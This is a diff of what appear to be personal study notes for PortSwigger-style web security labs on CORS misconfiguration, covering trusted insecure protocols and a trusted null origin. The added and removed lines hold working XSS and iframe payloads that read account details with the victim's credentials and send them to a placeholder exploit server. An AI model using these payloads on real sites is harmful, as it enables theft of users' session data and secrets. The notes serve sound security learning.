@@ -78,12 +78,32 @@
                   }
   Run maintenace to solve lab.
 
+### CORS 
+- Trusted insecure protocols 
+  > _**Identify**_ in the `source code` the account details are requested with AJAX request and it contains the user session cookie in the response.
+![[Pasted image 20261027125410.png]]
+Test if the application CORS configuration will allow access to sub-domains using below test header. If response include the `Access-Control-Allow-Origin` header with the origin reflect it is vulnerable to **CORS**. 
+```
+Origin: http://subdomain.TARGET.NET
+```
+```
+<script>
+    document.location="http://stock.TARGET.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://TARGET.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://EXPLOIT.NET/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
 
-## CORS Vulnerabilities:
-- ==CORS vulnerability with trusted insecure protocols== 
-  1. Response contains the `Access-Control-Allow-Credentials`
-  2. Review the history and observe that your key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS. Observe that the origin is reflected in the `Access-Control-Allow-Origin` header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
-  3. Open a product page, click **Check stock** and observe that it is loaded using a HTTP URL on a subdomain. Observe that the `productID` parameter is vulnerable to XSS.
-  4. ```
-     <script> document.location="http://stock.lab_id.web-security-academy.net/?productId=4%3cscript>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://lab_id.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-exploit_id.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
-     ```
+- Null origin trusted 
+add header `Origin: null`. If the `null` origin is reflected in the `Access-Control-Allow-Origin` header it is vulnerable.
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://TARGET.net/account_api/?EPOCHtime=1679134272000',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://EXPLOIT.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
